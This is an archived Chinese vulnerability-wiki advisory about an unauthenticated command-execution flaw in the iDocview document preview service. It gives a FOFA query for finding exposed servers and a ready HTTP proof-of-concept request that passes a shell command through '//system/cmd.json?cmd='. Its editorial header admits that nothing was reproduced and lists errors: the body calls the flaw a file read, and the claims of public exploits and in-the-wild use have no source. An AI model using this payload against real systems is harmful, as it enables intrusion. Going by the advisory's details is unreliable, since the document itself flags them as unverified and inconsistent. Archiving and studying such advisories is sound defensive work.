---
source: "SourByte05/Vulnerability-Wiki-PoC"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "iDocview系统接口存在RCE"
product: "iDocview在线预览服务"
record_type: "advisory"
document_type: "命令执行预警"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "文中6.9.8_20160812，双斜杠system/cmd.json，无Cookie样例但鉴权行为未证实"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/iDocview/iDocview%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8RCE.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
fofa_unverified: "title=="
fofa: "title==\"在线文档预览 - I Doc View\""
id: "vw-c2d1f1dea79c3cce6f72582a"
entity_id: "ve-c2d1f1dea79c3cce6f72582a"
schema_version: "1"
---

# iDocview系统接口存在RCE

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：iDocview在线预览服务
- 文献类型：命令执行预警
- 版本、权限及部署边界：文中6.9.8_20160812，双斜杠system/cmd.json，无Cookie样例但鉴权行为未证实
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 标题RCE而漏洞描述仍是文件读取，为复制粘贴错误
2. 双斜杠是否认证绕过关键与标准路径差异未解释，缺比较请求/响应
3. 在野已知与公开EXP无依据，官方修复仅以官方为准空话，未给修复版本或来源
4. fofa仅title==残缺，请求未围栏；不应与183文件读取合并成一漏洞

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<https://github.com/SourByte05/Vulnerability-Wiki-PoC>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

# 漏洞描述

此在线文档预览系统是一套用于在Web环境中展示和预览各种文档类型的系统，如文本文档、电子表格、演示文稿、PDF文件等。此系统某接口存在任意文件读取漏洞。

# 影响范围

Version: 6.9.8_20160812

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title=="在线文档预览 - I Doc View"

POC/EXP：

```http
GET //system/cmd.json?cmd=whoami HTTP/1.1
Host: 127.0.0.1:8050
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


![image-20231218110211290](./.resource/iDocview系统接口存在RCE/media/image-20231218110211290.png)


# 修复方案

**官方修复：**

1、以官方发布修复方案为准。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
